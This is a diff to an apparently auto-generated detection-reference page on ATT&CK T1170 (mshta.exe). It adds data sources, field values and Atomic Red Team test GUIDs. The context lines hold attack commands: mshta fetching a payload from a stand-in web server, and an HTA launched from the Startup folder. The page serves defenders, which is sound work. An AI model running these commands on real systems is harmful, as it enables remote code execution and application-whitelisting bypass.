@@ -15,14 +15,20 @@ They may also be executed directly from URLs: <code>mshta http[:]//webserver/pay
 
 Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Application whitelisting', 'Digital Certificate Validation']
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User']
 * Platforms: ['Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1170
 
@@ -182,7 +188,12 @@ mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
                            'attack.t1121',
                            'attack.t1127',
                            'attack.t1170'],
-                  'title': 'Possible Applocker Bypass'}}]
+                  'title': 'Possible Applocker Bypass'}},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['ID 1 & 7', 'Sysmon']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']}]
 ```
 
 ## Potential Queries
@@ -205,7 +216,8 @@ mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Mshta': {'atomic_tests': [{'description': 'Test '
+[{'Atomic Red Team Test - Mshta': {'atomic_tests': [{'auto_generated_guid': '1483fab9-4f52-4217-a9ce-daa9d7747cae',
+                                                     'description': 'Test '
                                                                     'execution '
                                                                     'of a '
                                                                     'remote '
@@ -233,7 +245,8 @@ mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
                                                              'Remote Payload '
                                                              'With GetObject',
                                                      'supported_platforms': ['windows']},
-                                                    {'description': 'Run a '
+                                                    {'auto_generated_guid': '906865c3-e05f-4acc-85c4-fbc185455095',
+                                                     'description': 'Run a '
                                                                     'local VB '
                                                                     'script to '
                                                                     'run local '
@@ -285,7 +298,8 @@ mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
                                                              'malicious '
                                                              'command',
                                                      'supported_platforms': ['windows']},
-                                                    {'description': 'Execute '
+                                                    {'auto_generated_guid': 'c4b97eeb-5249-4455-a607-59f95485cb45',
+                                                     'description': 'Execute '
                                                                     'an '
                                                                     'arbitrary '
                                                                     'remote '
